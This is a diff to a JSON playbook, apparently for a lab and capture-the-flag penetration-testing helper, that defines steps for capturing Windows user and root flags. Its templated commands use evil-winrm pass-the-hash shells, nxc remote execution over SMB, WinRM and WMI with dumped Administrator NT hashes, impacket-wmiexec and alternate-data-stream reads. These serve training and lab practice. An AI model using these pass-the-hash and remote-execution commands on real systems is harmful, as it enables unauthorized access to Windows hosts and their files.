@@ -86,6 +86,7 @@
     },
     {
       "id": "flag-hunt-windows",
+      "transition": "user_flag_win",
       "title": "Capture the User Flag (Windows)",
       "tool": "cmd",
       "priority": 97,
@@ -95,7 +96,9 @@
         "winrm.authenticated",
         "access.shell",
         "access.admin",
-        "access.system"
+        "access.system",
+        "credential.available",
+        "smb.shares"
       ],
       "os": [
         "windows"
@@ -111,40 +114,98 @@
       },
       "commands": [
         {
-          "tool": "cmd",
+          "tool": "evil-winrm",
           "locus": "onhost",
-          "win": true,
-          "note": "ON THE HOST, read the LOCATED user flag with your identity in the same frame (hostname + ipconfig + the flag) for the report screenshot. This unlocks once you have searched (the step below): obol fills the exact path from your locate, so it never hands you a Desktop that is not there. obol records this as the captured local flag.",
-          "run": "hostname; ipconfig; type {{flag_path_local}}"
-        },
-        {
-          "tool": "powershell",
-          "locus": "onhost",
-          "note": "LOCATE FIRST, in your WinRM/PowerShell session. The user flag sits on SOME user's Desktop, not yours once you are admin, so search for it before reading. Paste the path it prints and obol fills the read above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
-          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
-        },
-        {
-          "tool": "nxc",
-          "locus": "remote",
-          "note": "LOCATE OVER SMB (from Kali, if you hold a hash or credential and have no shell yet). Spider C$ for the flag files and records where they are. A remote read scores ZERO on OffSec, so get on the host to capture; for a lab grab the next line prints it outright.",
-          "run": "nxc smb {{target}} -u {{user}} -H {{nthash}} --spider C$ --regex \"(local|proof|user|root|flag)\\.txt\""
-        },
-        {
-          "tool": "nxc",
-          "locus": "remote",
-          "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile. Avoids the evil-winrm sealing bug entirely.",
-          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /r C:\\Users %i in ({{flag_names_windows}}) do @type \"%i\"'"
+          "requires_port": 5985,
+          "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
+          "note": "WINRM INTERACTIVE SHELL (Recommended when port 5985 is open): Connect directly over WinRM with domain credentials. Once connected, locate and capture the user flag."
         },
         {
           "tool": "evil-winrm",
           "locus": "onhost",
-          "note": "GET ON THE HOST interactively (if you hold a hash or credential and have no shell yet) so your flag read counts for the report. If evil-winrm throws CLIENT_TO_SERVER_SEALING the instant it connects on a fresh Kali, that is the rubyntlm 0.6.7 bug (auth already succeeded), not your hash: run `sudo gem install rubyntlm` for 0.6.8 and re-run. The Loadout arsenal applies this fix automatically.",
-          "run": "evil-winrm -i {{target}} -u {{user}} -H {{nthash}}"
+          "requires_port": 5985,
+          "run": "evil-winrm -i {{target}} -u '{{user}}' -H '{{nthash}}'",
+          "note": "WINRM PASS-THE-HASH SHELL: Connect directly over WinRM with a captured NT hash."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "IN-SESSION LOCATE FIRST: Inside your Evil-WinRM shell, recursively search user profiles to verify the exact path of user.txt. Paste the path it prints and obol fills the read below.",
+          "run": "Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "win": true,
+          "note": "IN-SESSION PROOF READ: Display host identity, IP, and the flag in the same frame for the report screenshot. Ungates once the flag path is confirmed.",
+          "run": "hostname; ipconfig; type {{flag_path_local}}"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 5985,
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "WINRM REMOTE LOCATE (When port 5985 is open): Search user profiles for the user flag remotely over WinRM in one command without opening an interactive shell.",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x 'Get-ChildItem -Path C:\\Users -Filter *user.txt -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 5985,
+          "note": "WINRM REMOTE READ (When port 5985 is open): Read the confirmed user flag directly over WinRM in one shot from Kali.",
+          "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x 'type {{flag_path_local}}'"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 5985,
+          "note": "WINRM REMOTE READ WITH NT HASH: Read the confirmed user flag over WinRM using pass-the-hash.",
+          "run": "nxc winrm {{target}} -u '{{user}}' -H '{{nthash}}' -x 'type {{flag_path_local}}'"
+        },
+        {
+          "tool": "smbclient",
+          "locus": "remote",
+          "requires_share": true,
+          "note": "SMB DIRECT CAPTURE (low-privileged domain credential, no shell required): On domain networks with a readable Users share (e.g. Active), grab user.txt directly over SMB from the user's Desktop. Works even when WinRM is closed and without any code execution on the target. If tree connect fails (NT_STATUS_BAD_NETWORK_NAME), use evil-winrm.",
+          "run": "smbclient '//{{target}}/Users' -U '{{domain}}/{{user}}%{{password}}' -c 'get {{user}}/Desktop/user.txt user.txt' && cat user.txt"
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_share": true,
+          "note": "LOCATE OVER SMB (from Kali): Spiders the Users share for flag files ending in .txt if the share exists.",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --spider Users --regex \"(local|proof|user|root|flag)\\.txt$\""
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_admin": true,
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*user*.txt\" \"%d\\Desktop\\*local*.txt\" 2>nul'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "REMOTE LOCATE OVER SMB: Searches every user profile Desktop over SMB. Note: Requires administrative execution rights on the target; if execution fails on non-admin accounts, use evil-winrm."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_admin": true,
+          "note": "LAB QUICK GRAB (not OffSec-legal): with the dumped Administrator hash, search every user's Desktop and print the flag remotely in one shot, no shell. obol fills the hash from the NTDS dump, no credential swap, and the names from your profile.",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*user*.txt\" 2>nul'"
         }
       ]
     },
     {
       "id": "flag-hunt-root-windows",
+      "transition": "root_flag_win",
       "title": "Capture the Root/Proof Flag (Windows)",
       "tool": "cmd",
       "priority": 98,
@@ -169,27 +230,133 @@
         {
           "tool": "nxc",
           "locus": "remote",
-          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type {{flag_path_root}}'",
-          "note": "PREFERRED, no shell needed. With the Administrator NT hash you just dumped from NTDS, read the root flag remotely over SMB. obol fills the hash from the dump (no credential swap) and the path from Administrator's Desktop, or from your locate if you searched. If evil-winrm died with CLIENT_TO_SERVER_SEALING (the rubyntlm 0.6.7 bug on a fresh Kali), use this: nxc reads the flag without evil-winrm."
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep with NT Hash over SMB): Scans every user profile Desktop for root/proof flags using the Administrator NT hash. Finishes in under 1 second. Paste output to ungate the flag read."
         },
         {
-          "tool": "cmd",
-          "locus": "onhost",
-          "win": true,
-          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report. obol records this as the captured root flag, the box's final objective.",
-          "run": "whoami; hostname; ipconfig; type {{flag_path_root}}"
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 5985,
+          "run": "nxc winrm {{target}} -u {{dauser}} -H {{dahash}} -x 'Get-ChildItem -Path C:\\Users -Filter *root*.txt -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "WINRM REMOTE LOCATE WITH NT HASH (When port 5985 is open): Fast PowerShell sweep over WinRM with the Administrator hash to find root/proof flags."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc wmi {{target}} -u {{dauser}} -H {{dahash}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "WMI REMOTE LOCATE WITH NT HASH: Sweep user profiles for root/proof flags over WMI using the Administrator NT hash."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc wmi {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "PREFERRED REMOTE LOCATE (Instant Desktop Sweep over WMI): Scans every user profile Desktop for root/proof flags without scanning deep subdirectories when administrative password is known. Finishes in under 1 second. Paste output to ungate the flag read."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "REMOTE LOCATE (Instant Desktop Sweep over SMB): Searches every user profile Desktop over SMB without traversing junction points or deep directories when administrative password is known."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc smb {{target}} -u {{dauser}} -H {{dahash}} -x 'type {{flag_path_root}}'",
+          "note": "PREFERRED SMB HASH READ: With the Administrator NT hash dumped from NTDS, read the located root flag remotely over SMB."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "requires_port": 5985,
+          "run": "nxc winrm {{target}} -u {{dauser}} -H {{dahash}} -x 'type {{flag_path_root}}'",
+          "note": "WINRM REMOTE READ WITH NT HASH: Read the located root flag over WinRM using the Administrator NT hash."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc wmi {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'type {{flag_path_root}}'",
+          "note": "PREFERRED WMI EXECUTION (When WinRM is closed): Read the located root flag directly over WMI (port 135) with administrative credentials."
+        },
+        {
+          "tool": "nxc",
+          "locus": "remote",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -d {{domain}} -x 'type {{flag_path_root}}'",
+          "note": "Remote read over SMB with administrative password."
         },
         {
           "tool": "impacket-wmiexec",
           "locus": "remote",
           "run": "impacket-wmiexec -hashes ':{{dahash}}' {{dauser}}@{{target}} 'type {{flag_path_root}}'",
-          "note": "Fallback remote read with the DA hash via impacket wmiexec (semi-interactive is also fine: impacket-wmiexec -hashes :{{dahash}} {{dauser}}@{{target}})."
+          "note": "Fallback remote read with the DA hash via impacket wmiexec."
+        },
+        {
+          "tool": "evil-winrm",
+          "locus": "onhost",
+          "requires_port": 5985,
+          "run": "evil-winrm -i {{target}} -u {{dauser}} -H {{dahash}}",
+          "note": "WINRM PASS-THE-HASH SHELL (Recommended when port 5985 is open): Connect directly over WinRM with the Administrator NT hash."
+        },
+        {
+          "tool": "evil-winrm",
+          "locus": "onhost",
+          "requires_port": 5985,
+          "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
+          "note": "WINRM INTERACTIVE SHELL: Connect directly over WinRM with administrative credentials."
         },
         {
           "tool": "powershell",
           "locus": "onhost",
-          "note": "LOCATE if the proof flag is NOT on Administrator's Desktop (rare). Searches every Desktop for your profile's flag names; paste the path it prints and obol fills the reads above. Plain cmd.exe shell instead? dir /s /b C:\\Users\\{{flag_names_windows}}",
-          "run": "Get-ChildItem C:\\Users -Recurse -Force -Include {{flag_names_windows}} -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName"
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "run": "Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *root*.txt,*proof*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName",
+          "note": "ON-HOST POWERSHELL LOCATE: If you have an interactive shell, search Desktops for root/proof flag files in under 1 second. Paste the path it prints to ungate the read command below."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "win": true,
+          "run": "whoami; hostname; ipconfig; type {{flag_path_root}}",
+          "note": "ON THE HOST as SYSTEM/Administrator, capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "run": "dir /r C:\\Users\\Administrator\\Desktop",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "note": "ON-HOST ADS LOCATE (Alternate Data Streams): Lists files and hidden alternate data streams on the Administrator Desktop. If flag files are hidden in streams (e.g. filename.txt:root.txt:$DATA), dir /r exposes them."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "settled_by": [
+            "objective.flag_located"
+          ],
+          "run": "Get-Item 'C:\\Users\\Administrator\\Desktop\\*' -Stream * | Where-Object { $_.Stream -ne ':$DATA' } | Select-Object FileName, Stream, Length",
+          "note": "POWERSHELL ADS LOCATE: Enumerates NTFS alternate data streams across all files in the Administrator desktop, filtering out the default :$DATA stream."
+        },
+        {
+          "tool": "powershell",
+          "locus": "onhost",
+          "run": "Get-Content 'C:\\Users\\Administrator\\Desktop\\{{filename}}' -Stream '{{stream_name}}'",
+          "note": "POWERSHELL ADS READ: Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
         }
       ]
     }
